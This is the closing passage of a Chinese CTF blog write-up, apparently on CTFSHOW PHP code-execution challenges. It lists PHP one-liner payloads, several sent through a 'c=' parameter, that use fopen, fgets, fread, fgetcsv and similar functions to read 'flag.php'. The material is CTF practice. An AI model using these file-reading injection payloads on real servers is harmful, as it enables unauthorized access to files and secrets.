class="hljs-comment">// 从当前位置一直读取到 EOF</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">fgetcsv</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;r&quot;</span>), <span class="hljs-variable">$size</span>));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">fgetss</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;r&quot;</span>))); <span class="hljs-comment">// 从文件指针中读取一行并过滤掉 HTML 标记</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">fscanf</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),<span class="hljs-string">&quot;%s&quot;</span>));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">parse_ini_file</span>(<span class="hljs-variable">$filename</span>)); <span class="hljs-comment">// 失败时返回 false , 成功返回配置数组</span><br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>)) &#123;<span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$line</span>;&#125;<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>)) &#123;<span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgetc</span>(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$line</span>;&#125;<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>)) &#123;<span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgetcsv</span>(<span class="hljs-variable">$a</span>);<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$line</span>);&#125;<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;1000&quot;</span>);<br></code></pre></td></tr></table></figure>
</li>
</ul>
<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/09/23/CTF-SHOW%20%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">← Next CTFSHOW-文件包含</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/09/11/CTF-SHOW%20SSRF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/">CTFSHOW-SSRF Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">RacerZ</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/RacerZ-fighting"><i class="fab fa-github" alt="GitHub"></i></a><a class="social" href="qiyizhang2002@foxmail.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.</span> <span class="toc-text">总结</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
lightGallery(document.getElementById('post-bg'), {
  plugins: [lgZoom,lgThumbnail],
  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
 cacheBust: false,
 selectors: ['title','article','#aside-block','.pjax-js'],
 switches: {'article': Pjax.switches.sideBySide},
 switchesOptions: {
   'article': {
     classNames: {
       remove: "pjax-out",
       add: "pjax-in"
     }
   }
 }
});
document.addEventListener("pjax:complete", reset);reset()})</script></body></html>